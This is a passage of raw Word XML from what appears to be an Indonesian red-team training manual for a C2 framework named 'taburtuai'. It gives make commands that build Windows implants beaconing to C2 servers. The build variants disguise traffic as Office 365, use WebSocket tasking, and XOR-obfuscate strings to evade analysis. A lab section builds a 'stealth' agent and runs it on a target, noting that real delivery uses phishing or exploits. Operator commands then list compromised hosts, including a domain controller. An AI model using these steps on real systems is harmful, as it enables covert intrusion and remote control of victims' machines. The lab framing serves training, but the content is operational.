    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Agent dengan profile office365 (menyerupai Microsoft traffic)</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C2_SERVER=https://c2.corp.local:8443 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  ENC_KEY=LabTrainingKey2026 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  PROFILE=office365</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Server harus dijalankan dengan profile yang sama</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>./bin/server --profile office365 --tls --tls-port 8443</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Build Agent WebSocket (Latensi Rendah)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>WebSocket transport mempertahankan satu koneksi persistent ke server. Server dapat push command langsung tanpa menunggu beacon interval, sehingga latensi eksekusi &lt;1 detik.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>make agent-win-ws \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  C2_SERVER=http://192.168.10.5:8080 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  ENC_KEY=LabTrainingKey2026 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  TRANSPORT=ws</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Server wajib dijalankan dengan --ws</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>./bin/server --ws --ws-port 8081</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Build Agent dengan String Enkripsi (Anti-Strings)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Target agent-win-encrypted meng-obfuskasi semua build-time strings (server URL, kunci) menggunakan XOR sederhana sehingga tidak terlihat dalam output strings.exe atau BinText.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>make agent-win-encrypted \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  C2_SERVER=http://192.168.10.5:8080 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  ENC_KEY=LabTrainingKey2026 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  XOR_KEY=0x4f</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:shd w:val="clear" w:color="auto" w:fill="C0392B"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  LAB 3.1  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  Build Agent untuk Lab Environment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 1:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Ganti IP di command berikut dengan IP mesin C2 server Anda.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 2:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Jalankan make build.</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C2_SERVER=http://&lt;IP_SERVER&gt;:8080 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  ENC_KEY=LabTrainingKey2026 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  INTERVAL=15 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  JITTER=20</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Verifikasi binary terbuat.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ls -lh bin/agent_windows_stealth.exe</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Transfer binary ke target VM (via shared folder, HTTP server, atau metode lain).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 5:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Jalankan binary di target VM dan perhatikan output di console server.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="100"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ℹ  Di lab, jalankan agent langsung dari command prompt. Di lapangan, delivery menggunakan stager, phishing, atau exploit.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 4 — AGENT MANAGEMENT &amp; CHECK-IN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Setelah agent berjalan di target, ia akan melakukan check-in ke server C2 dengan mengirimkan informasi sistem (hostname, username, OS, PID, privileges). Server mencatat agent dan membuatnya tersedia untuk operator.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Operator Console</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Operator berinteraksi dengan C2 melalui binary 'operator'. Console menyediakan prompt interaktif atau perintah satu-baris.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Jalankan console interaktif</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>./bin/operator console --server http://192.168.10.5:8080</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Jika autentikasi aktif</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>./bin/operator console --server http://192.168.10.5:8080 --api-key s3cr3t-key</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Prompt akan muncul:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># taburtuai(192.168.10.5:8080) ›</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Daftar Agent (List Agents)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Semua agent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>agents list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Filter hanya yang online</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>agents list --status online</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contoh:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># ID         HOSTNAME          USER        OS       STATUS   LAST SEEN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 7d019eb7   DESKTOP-VICTIM    john.doe    Windows  online   5s ago</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 4f1b8e23   DC01              SYSTEM      Windows  online   12s ago</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Detail Agent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Info lengkap satu agent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>agents info 7d019eb7</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contoh:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Agent: 7d019eb7-...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Hostname   : DESKTOP-VICTIM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Username   : CORP\john.doe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># OS         : Windows 11 Home (amd64)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># PID        : 4821</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Privileges : Medium</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Working Dir: C:\Users\john.doe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Last Seen  : 3s ago</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4537"/>
        <w:gridCol w:w="4537"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Command</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Fungsi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agents list</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>List semua agent terdaftar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agents list --status online</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>List agent yang aktif saja</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agents info &lt;id&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
